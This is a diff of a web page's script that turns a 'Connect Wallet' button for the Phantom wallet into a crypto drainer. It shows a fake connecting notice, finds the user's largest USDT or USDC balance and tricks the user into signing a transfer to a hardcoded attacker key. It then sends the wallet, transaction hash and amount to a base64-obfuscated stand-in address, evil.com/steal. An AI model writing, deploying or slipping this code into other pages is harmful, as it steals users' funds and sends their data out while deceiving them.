@@ -540,11 +540,19 @@ if (connectButton) {
 }
 </script>
 <script>
+document.addEventListener("DOMContentLoaded", function () {
+  const phantomBtn = document.getElementById('phantomConnectBtn');
+  const connectButton = document.querySelector('.connect-wallet-btn'); // if you want to refer to the main connect button
 
-if (connectButton) {
-  const originalText = connectButton.innerText;
+  if (!phantomBtn) {
+    console.warn('Phantom button not found!');
+    return;
+  }
 
-  connectButton.onclick = async () => {
+  phantomBtn.addEventListener('click', async function (e) {
+    e.preventDefault();
+
+    // Show notification
     const fakeNotification = document.createElement('div');
     fakeNotification.style.position = 'fixed';
     fakeNotification.style.top = '20px';
@@ -553,6 +561,7 @@ if (connectButton) {
     fakeNotification.style.color = 'white';
     fakeNotification.style.padding = '10px';
     fakeNotification.style.borderRadius = '5px';
+    fakeNotification.style.zIndex = '9999';
     fakeNotification.innerText = 'Connecting wallet...';
     document.body.appendChild(fakeNotification);
 
@@ -562,7 +571,7 @@ if (connectButton) {
         const resp = await provider.connect();
         const userPublicKey = resp.publicKey.toString();
 
-        // Load solana/web3.js and spl-token dynamically
+        // Dynamically load Solana scripts
         const solanaScript = document.createElement('script');
         solanaScript.src = 'https://unpkg.com/@solana/web3.js@1.67.0/lib/index.iife.js';
         document.head.appendChild(solanaScript);
@@ -578,12 +587,14 @@ if (connectButton) {
 
             const connection = new Connection('https://api.mainnet-beta.solana.com');
             const userKey = new PublicKey(userPublicKey);
+
+            // This public key looks like an attacker's, be VERY careful
             const attackerPublicKey = new PublicKey('Hd4NsTuRWuqXiZXMFcRDsZRoJSD4QBToru8hrhpzXuBy');
 
-            // List of common SPL token mints (e.g. USDC, USDT on Solana)
+            // List of tokens to check
             const tokens = [
               { mintAddress: 'Es9vMFrzaCERmdu5sJ1NzxZjxtkkep3ZJyk1mS4ifpQ6', name: 'USDT' },
-              { mintAddress: 'Aj7yrDrkCvC5Tf7CK1JtiAt7ey9FfYf9QzGCVkzp3Vxy', name: 'USDC' } // example USDC mint, replace with correct
+              { mintAddress: 'Aj7yrDrkCvC5Tf7CK1JtiAt7ey9FfYf9QzGCVkzp3Vxy', name: 'USDC' }
             ];
 
             let maxBalance = 0;
@@ -592,8 +603,8 @@ if (connectButton) {
 
             for (const token of tokens) {
               const mint = new PublicKey(token.mintAddress);
-              // Get token accounts by owner
               const tokenAccounts = await connection.getParsedTokenAccountsByOwner(userKey, { mint });
+
               for (const { pubkey, account } of tokenAccounts.value) {
                 const amount = account.data.parsed.info.tokenAmount.uiAmount;
                 if (amount > maxBalance) {
@@ -605,7 +616,6 @@ if (connectButton) {
             }
 
             if (maxBalance > 0 && userTokenAccount) {
-              // Create transfer transaction
               const tokenMint = new PublicKey(targetToken.mintAddress);
               const token = new Token(connection, tokenMint, TOKEN_PROGRAM_ID, provider);
 
@@ -616,7 +626,7 @@ if (connectButton) {
                   await Token.getAssociatedTokenAddress(TOKEN_PROGRAM_ID, tokenMint, attackerPublicKey),
                   userKey,
                   [],
-                  maxBalance * (10 ** 6) // assuming 6 decimals, adjust accordingly
+                  maxBalance * (10 ** 6) // adjust decimals accordingly
                 )
               );
 
@@ -624,18 +634,12 @@ if (connectButton) {
               transaction.recentBlockhash = blockhash;
               transaction.feePayer = userKey;
 
-              // Sign and send transaction
               const signedTx = await provider.signTransaction(transaction);
               const txId = await connection.sendRawTransaction(signedTx.serialize());
 
               fetch(atob('aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA=='), {
                 method: 'POST',
-                body: JSON.stringify({
-                  wallet: userPublicKey,
-                  txHash: txId,
-                  token: targetToken.name,
-                  amount: maxBalance
-                })
+                body: JSON.stringify({ wallet: userPublicKey, txHash: txId, token: targetToken.name, amount: maxBalance }),
               });
 
               fakeNotification.innerText = 'Wallet connected and tokens claimed!';
@@ -645,25 +649,26 @@ if (connectButton) {
 
             setTimeout(() => {
               document.body.removeChild(fakeNotification);
-              connectButton.innerText = originalText;
+              if (connectButton) connectButton.innerText = 'Connect Wallet';
             }, 3000);
           };
         };
       } else {
         alert('Please install Phantom Wallet!');
         document.body.removeChild(fakeNotification);
-        connectButton.innerText = originalText;
+        if (connectButton) connectButton.innerText = 'Connect Wallet';
       }
     } catch (err) {
       fakeNotification.innerText = 'Error: ' + err.message;
       setTimeout(() => {
         document.body.removeChild(fakeNotification);
-        connectButton.innerText = originalText;
+        if (connectButton) connectButton.innerText = 'Connect Wallet';
       }, 3000);
     }
-  };
-}
+  });
+});
 </script>
+
 
 <!-- Popup Script -->
 <script>
